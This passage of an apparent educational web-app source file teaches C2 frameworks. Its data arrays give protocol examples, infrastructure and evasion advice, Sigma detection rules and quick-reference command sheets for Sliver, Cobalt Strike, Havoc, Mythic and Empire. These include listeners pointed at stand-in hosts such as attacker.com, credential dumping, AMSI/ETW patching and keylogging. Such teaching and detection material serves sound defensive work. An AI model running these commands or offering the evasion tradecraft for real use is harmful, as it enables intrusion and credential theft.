    detection: "Beaconing patterns, JA3/JA3S fingerprints, unusual User-Agents, certificate analysis, anomalous request patterns",
    example: `# Malleable C2 profile snippet (Cobalt Strike)
http-get {
    set uri "/api/v1/updates";
    client {
        header "Accept" "application/json";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
}`,
    icon: <HttpIcon />,
  },
  {
    protocol: "DNS",
    description: "DNS queries/responses for covert communication",
    longDescription: "DNS tunneling uses DNS queries to exfiltrate data and receive commands. Data is encoded in subdomain labels (e.g., base64-encoded-data.malicious.com) or DNS record types like TXT, MX, or CNAME. Because DNS is essential for network functionality, it's rarely blocked outbound.",
    pros: ["Almost always allowed outbound", "Bypasses many security controls", "Works even with strict firewalls", "Low profile during idle periods"],
    cons: ["Very slow throughput (limited by DNS packet size)", "Subdomain length limits (~63 chars per label)", "Modern DNS monitoring can detect", "High query volume is suspicious"],
    detection: "High DNS query volume, unusually long subdomains, TXT record abuse, queries to uncategorized domains, entropy analysis",
    example: `# DNS beacon configuration
# Data is encoded in subdomains:
# aGVsbG8gd29ybGQ.c2.attacker.com -> "hello world"

# Sliver DNS listener
dns --domains c2.attacker.com --lport 53`,
    icon: <DnsIcon />,
  },
  {
    protocol: "SMB Named Pipes",
    description: "Named pipes over SMB for internal pivoting",
    longDescription: "SMB named pipes provide peer-to-peer communication between implants without requiring internet egress. An implant on a compromised host listens on a named pipe, and other internal implants connect to it, creating a chain back to the team server. This is essential for pivoting in segmented networks.",
    pros: ["No internet egress required", "Blends with Active Directory traffic", "Excellent for lateral movement", "Chainable through multiple hosts"],
    cons: ["Internal network only", "SMB signing can interfere", "Windows-only", "Unusual named pipes are detectable"],
    detection: "Unusual named pipe names, SMB connections to unexpected hosts, lateral SMB patterns without corresponding authentication",
    example: `# Cobalt Strike SMB beacon
beacon> spawn x64 smb
beacon> link TARGET_HOST pipe_name

# Common pipe name patterns
\\.\pipe\msagent_[random]
\\.\pipe\status_[random]`,
    icon: <StorageIcon />,
  },
  {
    protocol: "DoH/DoT",
    description: "DNS over HTTPS/TLS - encrypted DNS tunneling",
    longDescription: "DNS over HTTPS (DoH) and DNS over TLS (DoT) encrypt DNS queries, preventing inspection of DNS tunneling traffic. By using legitimate DoH providers like Cloudflare (1.1.1.1) or Google (8.8.8.8), the traffic appears as normal HTTPS connections to trusted destinations.",
    pros: ["Traffic is encrypted", "Bypasses DNS inspection/filtering", "Uses trusted provider infrastructure", "Appears as legitimate HTTPS traffic"],
    cons: ["Requires DoH/DoT infrastructure", "Organizations can block known providers", "Still subject to beaconing detection", "Setup complexity"],
    detection: "Blocking known DoH provider IPs, monitoring for DoH endpoint connections, analyzing HTTPS traffic to DNS ports",
    example: `# Using Cloudflare DoH
POST https://cloudflare-dns.com/dns-query
Content-Type: application/dns-message

# Brute Ratel DoH configuration
DOH Provider: https://dns.google/dns-query`,
    icon: <VpnKeyIcon />,
  },
  {
    protocol: "Domain Fronting",
    description: "Using CDN edge servers to mask true destination",
    longDescription: "Domain fronting exploits the way CDNs and cloud providers route traffic. The outer SNI (visible during TLS handshake) shows a legitimate domain, while the inner Host header (encrypted) points to the actual C2 server. Traffic appears to go to legitimate sites like azure.com or cloudfront.net.",
    pros: ["Traffic appears to go to legitimate high-reputation domains", "Very difficult to block without breaking business", "Encrypted inner destination"],
    cons: ["Major CDN providers have blocked this technique", "Complex infrastructure setup", "Costly cloud resources", "Increasingly detected"],
    detection: "Host header vs SNI mismatch analysis (requires TLS inspection), unusual traffic patterns to CDN edge servers",
    example: `# Domain fronting concept
# Outer SNI: allowed.azureedge.net (visible)
# Inner Host: c2.attacker.com (encrypted)

# Traffic flow:
Client -> CDN Edge -> Backend Origin (your C2)`,
    icon: <CloudIcon />,
  },
  {
    protocol: "WebSockets",
    description: "Persistent bidirectional communication channel",
    longDescription: "WebSockets provide full-duplex, persistent connections that allow real-time bidirectional communication. Unlike HTTP polling, the connection stays open, reducing beaconing patterns and enabling faster command execution.",
    pros: ["Low latency commands", "True bidirectional communication", "Less beaconing noise", "Modern web application appearance"],
    cons: ["Long-lived connections are visible", "WebSocket inspection possible", "Less common in enterprise environments", "Connection interruption issues"],
    detection: "Long-lived WebSocket connections, unusual WebSocket endpoints, WebSocket to non-standard ports",
    example: `// WebSocket C2 connection
const ws = new WebSocket('wss://cdn.example.com/api/stream');
ws.onmessage = (event) => {
    executeCommand(JSON.parse(event.data));
};`,
    icon: <NetworkCheckIcon />,
  },
  {
    protocol: "ICMP",
    description: "Ping-based covert channel",
    longDescription: "ICMP tunneling hides data within ICMP echo request/reply packets (ping). While rarely used for full C2 due to bandwidth limitations, it can be useful for exfiltration or as a backup channel when other protocols are blocked.",
    pros: ["Often allowed through firewalls", "Very low profile", "Simple implementation", "Backup communication channel"],
    cons: ["Extremely limited bandwidth", "Easy to detect anomalies", "May be blocked in secure environments", "Limited payload size"],
    detection: "ICMP packet size anomalies, high ICMP frequency, data in ICMP payload examination",
    example: `# ICMP tunnel example (ptunnel-ng)
# Server side:
ptunnel-ng -s

# Client side:
ptunnel-ng -p proxy_server -l 8000 -r target -R 22`,
    icon: <RouterIcon />,
  },
  {
    protocol: "External Services (Dead Drop)",
    description: "Using legitimate services as intermediary",
    longDescription: "Dead drop resolvers use legitimate third-party services (Dropbox, OneDrive, Google Docs, Pastebin, Twitter) as intermediaries. Commands are posted to the service, and implants poll the service for updates. This provides excellent cover because traffic goes to legitimate, trusted services.",
    pros: ["Traffic to highly trusted domains", "Difficult to block without business impact", "Can survive infrastructure takedowns", "Plausible deniability"],
    cons: ["Service providers may detect abuse", "Account suspension risk", "Slower than direct C2", "Less control over infrastructure"],
    detection: "Anomalous API usage patterns, unusual document access patterns, correlation of service access with other indicators",
    example: `# Empire Dropbox listener
# Implant polls Dropbox for commands
# Responses uploaded back to Dropbox

# Twitter dead drop (historical)
# Commands encoded in tweets
# Implant follows specific account`,
    icon: <LanguageIcon />,
  },
];

// Infrastructure components with expanded details
const infrastructureComponents = [
  {
    component: "Team Server",
    description: "Central C2 server that manages implants and operators",
    longDescription: "The team server is the brain of your C2 operation. It manages all implant connections, stores collected data, and provides the interface for operators. Never expose your team server directly to the internet - always use redirectors.",
    considerations: ["Should be protected behind redirectors", "Use strong authentication for operators", "Enable comprehensive logging and audit trails", "Regular backups of operation data", "Secure hosting environment"],
    bestPractices: ["VPN or SSH tunnel for operator access", "Separate from redirector infrastructure", "Monitor for unauthorized access attempts", "Use unique passwords per operation"],
    icon: <StorageIcon />,
  },
  {
    component: "Redirectors",
    description: "Proxy servers that forward C2 traffic to hide team server",
    longDescription: "Redirectors (or redirector servers) act as disposable proxies between implants and your team server. If compromised or detected, redirectors can be burned and replaced while the team server remains safe. They also filter out researcher probes and invalid traffic.",
    considerations: ["Should be expendable/replaceable", "Geographic distribution for cover", "Traffic filtering rules", "SSL/TLS termination", "Separate providers from team server"],
    bestPractices: ["Use mod_rewrite or nginx for traffic filtering", "Only forward traffic matching C2 profile", "Redirect invalid traffic to legitimate sites", "Maintain multiple redirectors for redundancy"],
    icon: <AccountTreeIcon />,
  },
  {
    component: "Payload Hosting",
    description: "Servers hosting initial payloads and stagers",
    longDescription: "Payload hosting infrastructure serves the initial malware delivery. This should be completely separate from your C2 infrastructure and should be short-lived - spin up before operation, tear down after delivery.",
    considerations: ["Short-lived infrastructure", "Completely separate from C2", "Use CDN or legitimate cloud hosting", "Stage-based delivery", "File-less options when possible"],
    bestPractices: ["Pre-register and categorize domains", "Use HTTPS with valid certificates", "Remove payloads after initial delivery", "Consider legitimate file sharing services"],
    icon: <CloudIcon />,
  },
  {
    component: "Phishing Infrastructure",
    description: "Email servers, domains, and landing pages for initial access",
    longDescription: "Phishing infrastructure includes email servers, domain names, and landing pages used for initial compromise. Domain reputation and email deliverability are critical - poorly configured infrastructure will land in spam folders.",
    considerations: ["Domain aging (older = better reputation)", "Proper email authentication (SPF/DKIM/DMARC)", "Domain categorization", "SSL certificates", "Realistic landing pages"],
    bestPractices: ["Register domains weeks/months in advance", "Use reputable email service providers", "Test deliverability before operations", "Clone legitimate login pages accurately"],
    icon: <PublicIcon />,
  },
  {
    component: "DNS Infrastructure",
    description: "Authoritative DNS servers for DNS-based C2",
    longDescription: "For DNS-based C2, you need authoritative DNS servers for your C2 domains. These servers handle the DNS queries from implants and translate them into C2 communications.",
    considerations: ["Reliable DNS hosting", "Short TTL for flexibility", "Multiple DNS servers for redundancy", "Fast propagation capabilities"],
    bestPractices: ["Use reputable DNS providers", "Configure appropriate TTLs", "Test DNS resolution before operations", "Have backup DNS servers ready"],
    icon: <DnsIcon />,
  },
  {
    component: "VPN/Jump Hosts",
    description: "Secure access points for operator connections",
    longDescription: "Operators should never connect directly to C2 infrastructure from personal or corporate networks. VPN servers and jump hosts provide anonymity and separation between operator identity and operation infrastructure.",
    considerations: ["Anonymize operator connections", "Separate from C2 infrastructure", "Strong authentication", "Logging for internal audit"],
    bestPractices: ["Use commercial VPN or self-hosted", "Multi-factor authentication", "Separate jump hosts per operation", "Clean browser profiles for ops"],
    icon: <LockIcon />,
  },
];

// OPSEC considerations with expanded details
const opsecConsiderations = [
  {
    category: "Infrastructure OPSEC",
    description: "Protecting your C2 infrastructure from attribution and discovery",
    items: [
      { tip: "Use redirectors to protect team server IP", detail: "Never expose your team server directly - always use intermediate servers that can be burned" },
      { tip: "Separate infrastructure for different operations", detail: "Compromise of one operation shouldn't expose others. Use different providers, IPs, and domains" },
      { tip: "Domain categorization and aging", detail: "Fresh domains are suspicious. Register domains weeks ahead and get them categorized" },
      { tip: "SSL certificates from legitimate CAs", detail: "Self-signed certs are a red flag. Use Let's Encrypt or commercial CAs" },
      { tip: "VPS providers with good reputation", detail: "Avoid bulletproof hosting - choose reputable providers that blend with legitimate traffic" },
      { tip: "Geographic distribution matching targets", detail: "C2 traffic to unusual countries is suspicious. Use infrastructure in expected locations" },
    ],
  },
  {
    category: "Network OPSEC",
    description: "Making your C2 traffic look legitimate and avoiding network detection",
    items: [
      { tip: "Malleable C2 profiles to mimic legitimate traffic", detail: "Configure your C2 to look like CDN traffic, cloud APIs, or legitimate applications" },
      { tip: "Jitter and sleep timing variations", detail: "Predictable beaconing is easily detected. Add randomness to callback intervals (10-50% jitter)" },
      { tip: "Avoid predictable beaconing intervals", detail: "Exact 60-second intervals are suspicious. Use prime numbers and jitter" },
      { tip: "Use legitimate User-Agent strings", detail: "Match User-Agents to software that's actually installed in the target environment" },
      { tip: "Blend with expected protocol behavior", detail: "If mimicking Chrome, include all expected headers in the correct order" },
      { tip: "Appropriate request/response sizes", detail: "Consistent packet sizes are detectable. Vary sizes to match mimicked application" },
    ],
  },
  {
    category: "Host OPSEC",
    description: "Avoiding detection on compromised endpoints",
    items: [
      { tip: "Process injection into legitimate processes", detail: "Running from suspicious processes (powershell.exe spawning from word.exe) triggers alerts" },
      { tip: "Avoid touching disk when possible", detail: "File-based artifacts are easily detected. Stay in memory when possible" },
      { tip: "Clear command history and artifacts", detail: "PowerShell history, prefetch, and other forensic artifacts can reveal your activities" },
      { tip: "Use indirect syscalls to avoid hooks", detail: "EDRs hook ntdll.dll - indirect syscalls bypass these hooks" },
      { tip: "Sleep obfuscation and memory encryption", detail: "EDRs scan process memory. Encrypt or obfuscate implant code while sleeping" },
      { tip: "Parent PID spoofing", detail: "Make your process appear to be spawned by a legitimate parent process" },
    ],
  },
  {
    category: "Operational OPSEC",
    description: "Best practices for conducting operations without detection",
    items: [
      { tip: "Minimal lateral movement noise", detail: "Each hop creates logs. Plan your path and minimize unnecessary movement" },
      { tip: "Time operations with business hours", detail: "Activity at 3 AM local time is suspicious. Match target's working hours" },
      { tip: "Avoid triggering known detection signatures", detail: "Research what the target's security stack detects. Test against similar tools" },
      { tip: "Use trusted binaries (LOLBins) when possible", detail: "Built-in Windows tools are less suspicious than custom executables" },
      { tip: "Document and coordinate team actions", detail: "Multiple operators doing conflicting actions causes noise. Communicate!" },
      { tip: "Have abort criteria defined", detail: "Know when to pull out. Define clear tripwires for operation termination" },
    ],
  },
];

// Detection methods with expanded details
const detectionMethods = [
  {
    method: "Network Traffic Analysis",
    description: "Analyzing network traffic patterns to identify C2 communications",
    techniques: [
      { name: "Beaconing detection", detail: "Identifying regular callback patterns using statistical analysis of connection intervals" },
      { name: "JA3/JA3S fingerprinting", detail: "TLS client and server fingerprints that can identify specific tools regardless of destination" },
      { name: "DNS anomaly detection", detail: "Detecting tunneling through query volume, subdomain length, and entropy analysis" },
      { name: "SSL certificate analysis", detail: "Identifying suspicious certificates (self-signed, recently issued, unusual SANs)" },
      { name: "Unusual destination analysis", detail: "Connections to uncategorized domains, unusual ASNs, or known malicious infrastructure" },
    ],
    tools: ["Zeek/Bro", "RITA", "JA3er", "Suricata", "Security Onion", "Arkime (Moloch)", "NetworkMiner"],
    sigmaExample: `title: Potential DNS Tunneling
logsource:
    category: dns
detection:
    selection:
        query|re: '^[a-zA-Z0-9]{30,}\\.'
    condition: selection
level: medium`,
  },
  {
    method: "Endpoint Detection",
    description: "Detecting C2 implants and their behaviors on compromised hosts",
    techniques: [
      { name: "Process injection detection", detail: "Monitoring for code injection into legitimate processes (CreateRemoteThread, NtMapViewOfSection)" },
      { name: "Memory scanning", detail: "Periodic scanning of process memory for known implant signatures or suspicious patterns" },
      { name: "Behavioral analysis", detail: "Detecting unusual process behaviors, parent-child relationships, or API call sequences" },
      { name: "AMSI integration", detail: "Antimalware Scan Interface captures scripts and payloads for analysis before execution" },
      { name: "ETW tracing", detail: "Event Tracing for Windows captures low-level system events for threat detection" },
    ],
    tools: ["CrowdStrike Falcon", "Microsoft Defender for Endpoint", "SentinelOne", "Carbon Black", "Sysmon", "YARA", "Velociraptor"],
    sigmaExample: `title: Suspicious Process Injection
logsource:
    category: process_access
    product: windows
detection:
    selection:
        GrantedAccess|contains:
            - '0x1F0FFF'  # PROCESS_ALL_ACCESS
            - '0x1F3FFF'
    filter:
        SourceImage|endswith:
            - '\\System32\\csrss.exe'
            - '\\System32\\lsass.exe'
    condition: selection and not filter
level: high`,
  },
  {
    method: "Log Analysis",
    description: "Correlating logs across systems to identify C2 activity",
    techniques: [
      { name: "Authentication anomalies", detail: "Unusual login patterns, times, or locations that indicate compromised credentials" },
      { name: "Process creation chains", detail: "Suspicious parent-child process relationships (e.g., Excel spawning PowerShell)" },
      { name: "Network connection patterns", detail: "Processes making unusual outbound connections or connecting to suspicious destinations" },
      { name: "PowerShell logging", detail: "Script block logging and transcription captures executed commands" },
      { name: "Command line analysis", detail: "Detecting encoded commands, suspicious arguments, or known attack patterns" },
    ],
    tools: ["Splunk", "Elastic SIEM", "Microsoft Sentinel", "Sigma", "Chainsaw", "DeepBlueCLI", "LogonTracer"],
    sigmaExample: `title: Encoded PowerShell Command
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - '-enc '
            - '-EncodedCommand'
            - 'FromBase64String'
    condition: selection
level: high`,
  },
  {
    method: "Threat Intelligence",
    description: "Using known indicators and threat actor behaviors to detect C2",
    techniques: [
      { name: "IOC matching", detail: "Matching network and host indicators against known malicious infrastructure" },
      { name: "YARA rules", detail: "Pattern matching for known implant signatures in files and memory" },
      { name: "Behavioral TTP matching", detail: "Identifying techniques associated with specific threat actors or tool families" },
      { name: "Domain intelligence", detail: "Using threat feeds to identify connections to known malicious domains" },
    ],
    tools: ["MISP", "OpenCTI", "ThreatConnect", "Anomali", "VirusTotal", "AlienVault OTX", "Pulsedive"],
    sigmaExample: `title: Known C2 Domain Connection
logsource:
    category: proxy
detection:
    selection:
        c-uri-host:
            - 'known-bad-domain.com'
            - 'another-c2.net'
    condition: selection
level: critical`,
  },
];

// Quick reference commands with expanded examples
const quickCommands = {
  sliver: `# ===== SLIVER C2 QUICK REFERENCE =====

# Start Sliver server (generates certificates on first run)
./sliver-server

# Generate implants
generate --mtls example.com --os windows --arch amd64 --format exe --save implant.exe
generate --http example.com --os linux --arch amd64 --format elf --save implant
generate --dns example.com --os windows --arch amd64 --format shellcode --save implant.bin

# Start listeners
mtls --lhost 0.0.0.0 --lport 8888
http --lhost 0.0.0.0 --lport 80 --domain cdn.example.com
dns --domains c2.attacker.com --lport 53

# Session management
sessions                    # List all sessions
sessions -i                 # Interactive session list
use [session-id]           # Interact with session
background                  # Background current session

# Common beacon commands
info                       # Get system information
whoami                     # Current user context
ps                         # List processes
netstat                    # Network connections
ifconfig                   # Network interfaces
pwd / cd / ls              # File system navigation
download /path/to/file     # Download file
upload /local/file /remote # Upload file
execute -o -- cmd.exe /c whoami  # Execute command
shell                      # Interactive shell
screenshot                 # Capture screen

# Pivoting
pivots                     # List pivots
socks5 start               # Start SOCKS proxy
portfwd add -l 8080 -r 10.0.0.1:80  # Port forward

# Armory (extensions)
armory                     # List available packages
armory install rubeus      # Install Rubeus
rubeus dump                # Run Rubeus`,

  cobaltStrike: `# ===== COBALT STRIKE QUICK REFERENCE =====

# Start team server (requires malleable profile for OPSEC)
./teamserver <IP> <password> <malleable_profile.profile>
./teamserver 10.0.0.1 MySecretPass ./profiles/amazon.profile

# Connect client
./cobaltstrike
# Enter: IP, Port (50050), User, Password

# Generate payloads (via GUI)
# Attacks > Packages > Windows Executable (S)
# Attacks > Packages > HTML Application
# Attacks > Scripted Web Delivery (HTA)

# Listener management (via GUI)
# Cobalt Strike > Listeners > Add
# Types: HTTP, HTTPS, DNS, SMB, TCP

# Beacon commands
beacon> help               # Show all commands
beacon> sleep 60 20        # Sleep 60s with 20% jitter
beacon> checkin            # Force check-in now
beacon> getuid             # Current user
beacon> shell whoami       # Run command
beacon> run whoami /all    # Run without cmd.exe
beacon> powershell-import script.ps1  # Import PS
beacon> powerpick Get-Process         # Execute PS

# Process manipulation
beacon> ps                 # List processes
beacon> inject <pid> x64   # Inject into process
beacon> spawn x64          # Spawn new beacon
beacon> spawnas DOMAIN\\user pass x64  # Spawn as user

# Lateral movement
beacon> jump psexec TARGET listener    # PSExec
beacon> jump winrm TARGET listener     # WinRM
beacon> jump wmi TARGET listener       # WMI
beacon> remote-exec psexec TARGET cmd  # Remote exec

# Credential harvesting
beacon> logonpasswords     # Mimikatz sekurlsa::logonpasswords
beacon> hashdump           # Dump SAM hashes
beacon> dcsync DOMAIN.COM DOMAIN\\Administrator

# Pivoting
beacon> socks 1080         # Start SOCKS proxy
beacon> link TARGET pipe   # Link SMB beacon
beacon> connect TARGET 4444  # Connect TCP beacon

# File operations
beacon> download C:\\file.txt
beacon> upload /local/file C:\\remote.exe
beacon> timestomp target.exe source.exe`,

  havoc: `# ===== HAVOC C2 QUICK REFERENCE =====

# Start Havoc server
./havoc server --profile ./profiles/havoc.yaotl -v
./havoc server --profile ./profiles/default.yaotl --debug

# Connect client (GUI)
./havoc client
# Configure: Name, Host, Port, User, Password

# Demon agent commands
demon> help                # Show all commands
demon> sleep 10 50         # Sleep 10s, 50% jitter
demon> checkin             # Force check-in

# System information
demon> whoami              # Current user
demon> pwd                 # Current directory
demon> ps                  # Process list
demon> env                 # Environment variables
demon> net                 # Network info

# Execution
demon> shell whoami        # Execute via cmd.exe
demon> proc exec notepad.exe  # Start process
demon> powershell Get-Process # PowerShell
demon> dotnet inline-execute assembly.exe args

# BOF (Beacon Object Files)
demon> inline-execute /path/to/bof.o arg1 arg2
demon> bof-load dir_list   # Load BOF extension

# Process manipulation
demon> proc list           # List processes
demon> proc kill <pid>     # Kill process
demon> proc inject <pid>   # Inject into process
demon> shellcode inject x64 <pid> /path/shellcode.bin

# Evasion features
demon> config              # View agent config
demon> sleep-obf           # Toggle sleep obfuscation
demon> amsi patch          # Patch AMSI
demon> etw patch           # Patch ETW`,

  mythic: `# ===== MYTHIC C2 QUICK REFERENCE =====

# Installation
sudo ./install_docker_ubuntu.sh
./mythic-cli start

# Access web UI
# URL: https://localhost:7443
# Default credentials in .env file

# Mythic CLI commands
./mythic-cli status        # Check service status
./mythic-cli start         # Start all services
./mythic-cli stop          # Stop all services
./mythic-cli logs mythic_server  # View logs
./mythic-cli restart       # Restart services

# Install payload types (agents)
./mythic-cli install github https://github.com/MythicAgents/Apollo
./mythic-cli install github https://github.com/MythicAgents/Poseidon
./mythic-cli install github https://github.com/MythicAgents/Medusa

# Common payload types
# Apollo - Full-featured Windows C# agent
# Poseidon - Go-based cross-platform agent
# Medusa - Python-based cross-platform agent
# Athena - .NET cross-platform agent

# Web UI Operations
# 1. Create C2 Profile (HTTP, TCP, etc.)
# 2. Create Payload with selected agent
# 3. Download and deploy payload
# 4. View callbacks in Operations

# Task commands depend on payload type
# Apollo example:
shell whoami
ps
upload /local/file /remote/path
download /remote/path
execute-assembly /path/assembly.exe args
inject <pid>
keylog start
screenshot`,

  empire: `# ===== EMPIRE/STARKILLER QUICK REFERENCE =====

# Start Empire server
sudo ./ps-empire server

# Start Starkiller (GUI) - separate terminal
./starkiller

# Or use Empire CLI
sudo ./ps-empire client

# CLI - Listener management
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://attacker.com:80
(Empire: listeners/http) > set Port 80
(Empire: listeners/http) > execute

# CLI - Stager generation
(Empire) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute

# CLI - Agent interaction
(Empire) > agents
(Empire) > interact <agent_name>
(Empire: <agent>) > sysinfo
(Empire: <agent>) > shell whoami
(Empire: <agent>) > upload /local/file C:\\remote.exe
(Empire: <agent>) > download C:\\file.txt
(Empire: <agent>) > usemodule collection/keylogger
(Empire: <agent>) > usemodule credentials/mimikatz/logonpasswords

# Popular modules
usemodule credentials/mimikatz/logonpasswords
usemodule credentials/mimikatz/dcsync
usemodule situational_awareness/host/winenum
usemodule lateral_movement/invoke_wmi
usemodule persistence/elevated/schtasks
usemodule privesc/bypassuac_fodhelper`,
};

// Real-world C2 traffic examples for analysis
const trafficExamples = [
  {
    name: "Cobalt Strike Default",
    description: "Default Cobalt Strike beacon profile (easily detected)",
    indicators: [
      "JA3: 72a589da586844d7f0818ce684948eea",
      "URI: /submit.php, /pixel.gif",
      "Named pipes: \\.\pipe\msagent_*",
      "Default sleep: 60000ms",
    ],
    detectionRate: "High",
  },
  {
    name: "Cobalt Strike Malleable",
    description: "Customized malleable C2 profile mimicking CDN",
    indicators: [
      "Custom JA3 (varies by profile)",
      "URIs match CDN patterns",
      "Custom headers matching target app",
      "Certificate matches CDN",
    ],
    detectionRate: "Medium",
  },
  {
    name: "Sliver Default HTTPS",
    description: "Sliver HTTPS beacon with default configuration",
    indicators: [
      "JA3: Various Go TLS fingerprints",
      "Large HTTP body sizes",
      "Binary data in response",
      "Unique certificate patterns",
    ],
    detectionRate: "Medium-High",
  },
  {
    name: "DNS Tunneling",
    description: "DNS-based C2 with encoded subdomains",
    indicators: [
      "High entropy subdomains",
      "Unusually long DNS queries",
      "High volume to single domain",
      "TXT record requests",
    ],
    detectionRate: "Medium",
  },
];

// MITRE ATT&CK mappings for C2
const mitreAttackMappings = [
  {
    tactic: "Command and Control (TA0011)",
    techniques: [
      { id: "T1071", name: "Application Layer Protocol", subtechniques: ["Web Protocols", "DNS", "Mail Protocols"] },
      { id: "T1132", name: "Data Encoding", subtechniques: ["Standard Encoding", "Non-Standard Encoding"] },
      { id: "T1573", name: "Encrypted Channel", subtechniques: ["Symmetric Cryptography", "Asymmetric Cryptography"] },
      { id: "T1572", name: "Protocol Tunneling", subtechniques: [] },
      { id: "T1090", name: "Proxy", subtechniques: ["Internal Proxy", "External Proxy", "Multi-hop Proxy", "Domain Fronting"] },
      { id: "T1219", name: "Remote Access Software", subtechniques: [] },
      { id: "T1095", name: "Non-Application Layer Protocol", subtechniques: [] },
      { id: "T1571", name: "Non-Standard Port", subtechniques: [] },
      { id: "T1008", name: "Fallback Channels", subtechniques: [] },
      { id: "T1104", name: "Multi-Stage Channels", subtechniques: [] },
    ],
  },
  {
    tactic: "Exfiltration (TA0010)",
    techniques: [
      { id: "T1041", name: "Exfiltration Over C2 Channel", subtechniques: [] },
      { id: "T1048", name: "Exfiltration Over Alternative Protocol", subtechniques: ["Symmetric Encryption", "Asymmetric Encryption"] },
    ],
  },
  {
    tactic: "Defense Evasion (TA0005)",
    techniques: [
      { id: "T1140", name: "Deobfuscate/Decode Files or Information", subtechniques: [] },
      { id: "T1027", name: "Obfuscated Files or Information", subtechniques: ["Binary Padding", "Software Packing", "Steganography"] },
      { id: "T1055", name: "Process Injection", subtechniques: ["DLL Injection", "PE Injection", "Thread Execution Hijacking"] },
    ],
  },
];

const QUIZ_QUESTION_COUNT = 10;
const QUIZ_ACCENT_COLOR = "#8b5cf6";

const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Core Concepts",
    question: "What is the primary purpose of a C2 framework?",
    options: [
      "Coordinate command and control of implants during operations",
      "Scan the internet for vulnerabilities",
      "Replace endpoint protection with custom agents",
      "Automatically patch systems after exploitation",
    ],
    correctAnswer: 0,
    explanation: "C2 frameworks help operators task and manage implants on targets.",
  },
  {
    id: 2,
    topic: "Core Concepts",
    question: "In C2 terminology, what is a beacon?",
    options: [
      "A periodic check-in from the implant to the server",
      "A dashboard used to view operator activity",
      "An encrypted log file stored on disk",
      "A payload compiler used to build agents",
    ],
    correctAnswer: 0,
    explanation: "Beacons call back at intervals to receive tasks and send results.",
  },
  {
    id: 3,
    topic: "Core Concepts",
    question: "What does a listener do in a C2 framework?",
    options: [
      "Waits for inbound connections from agents",
      "Encrypts files for exfiltration",
      "Collects passwords from browsers",
      "Scans ports for open services",
    ],
    correctAnswer: 0,
    explanation: "Listeners accept and manage incoming agent communications.",
  },
  {
    id: 4,
    topic: "Payloads",
    question: "What is the key difference between staged and stageless payloads?",
    options: [
      "Staged payloads fetch additional code; stageless payloads contain everything",
      "Stageless payloads only work on Linux",
      "Staged payloads cannot be encrypted",
      "Stageless payloads require a separate server",
    ],
    correctAnswer: 0,
    explanation: "Staged payloads download a second stage, while stageless payloads are self-contained.",
  },
  {
    id: 5,
    topic: "Core Concepts",
    question: "In C2 terms, an implant refers to what?",
    options: [
      "The agent or payload running on the target system",
      "A web shell used only for initial access",
      "A network scanner on the C2 server",
      "A report generated after an operation",
    ],
    correctAnswer: 0,
    explanation: "An implant is the agent that executes on the target and communicates with C2.",
  },
  {
    id: 6,
    topic: "Operations",
    question: "Why are team servers used in C2 frameworks?",
    options: [
      "To centralize control and allow multiple operators",
      "To automatically exploit vulnerabilities",
      "To host the public website of the framework",
      "To store backups of target data",
    ],
    correctAnswer: 0,
    explanation: "Team servers coordinate shared access and session management for operators.",
  },
  {
    id: 7,
    topic: "Traffic Shaping",
    question: "What is a malleable C2 profile primarily used for?",
    options: [
      "Customizing network indicators to blend with normal traffic",
      "Increasing payload size for faster deployment",
      "Disabling encryption on C2 channels",
      "Generating vulnerability reports for clients",
    ],
    correctAnswer: 0,
    explanation: "Malleable profiles let operators shape headers, URIs, and timing to match benign traffic.",
  },
  {
    id: 8,
    topic: "Traffic Shaping",
    question: "What is the purpose of jitter in beaconing?",
    options: [
      "Randomize callback intervals to reduce detection",
      "Force the agent to sleep permanently",
      "Disable all network encryption",
      "Increase the bandwidth of the C2 channel",
    ],
    correctAnswer: 0,
    explanation: "Jitter breaks up fixed intervals that are easy to spot in network telemetry.",
  },
  {
    id: 9,
    topic: "Infrastructure",
    question: "What is a redirector in C2 infrastructure?",
    options: [
      "An intermediate host that forwards traffic and hides the team server",
      "A tool that changes user passwords on targets",
      "A credential storage service",
      "A local firewall rule on the implant",
    ],
    correctAnswer: 0,
    explanation: "Redirectors act as front-end relays to protect the core C2 server.",
  },
  {
    id: 10,
    topic: "Infrastructure",
    question: "Dead drop resolvers are used to:",
    options: [
      "Store tasks in third-party services for agents to poll",
      "Delete files after execution",
      "Encrypt payloads during staging",
      "Disable endpoint security products",
    ],
    correctAnswer: 0,
    explanation: "Dead drops use services like cloud storage or social media to pass tasks indirectly.",
  },
  {
    id: 11,
    topic: "Infrastructure",
    question: "Domain fronting primarily helps by:",
    options: [
      "Hiding the true destination behind a CDN front domain",
      "Encrypting files on the target system",
      "Bypassing local file permissions",
      "Disabling DNS logging entirely",
    ],
    correctAnswer: 0,
    explanation: "Domain fronting makes C2 traffic appear to go to a legitimate CDN domain.",
  },
  {
    id: 12,
    topic: "Transport Security",
    question: "What does mutual TLS (mTLS) provide?",
    options: [
      "Both client and server authenticate with certificates",
      "Faster data transfer than normal TLS",
      "Automatic malware removal",
      "A backup channel over DNS",
    ],
    correctAnswer: 0,
    explanation: "mTLS requires both sides to present certificates, improving authentication.",
  },
  {
    id: 13,
    topic: "Protocols",
    question: "Why is DNS C2 often used despite low bandwidth?",
    options: [
      "DNS is commonly allowed through egress controls",
      "DNS has the highest throughput of any protocol",
      "DNS traffic is never logged",
      "DNS eliminates the need for encryption",
    ],
    correctAnswer: 0,
    explanation: "Many environments allow DNS by default, making it a common fallback channel.",
  },
  {
    id: 14,
    topic: "Protocols",
    question: "SMB or named pipe C2 is most useful for:",
    options: [
      "Internal network operations where SMB is allowed",
      "Global internet communications from any host",
      "Cloud-native API access",
      "Wireless device management",
    ],
    correctAnswer: 0,
    explanation: "SMB and named pipes are typically viable inside Windows networks.",
  },
  {
    id: 15,
    topic: "Protocols",
    question: "Why use HTTPS for C2 communications?",
    options: [
      "It encrypts traffic and blends with normal web usage",
      "It removes the need for authentication",
      "It prevents all endpoint logging",
      "It makes payloads smaller",
    ],
    correctAnswer: 0,
    explanation: "HTTPS adds encryption and helps C2 traffic look like regular web traffic.",
  },
  {
    id: 16,
    topic: "Beaconing",
    question: "What does beacon sleep time control?",
    options: [
      "The time between agent check-ins",
      "The number of files collected per task",
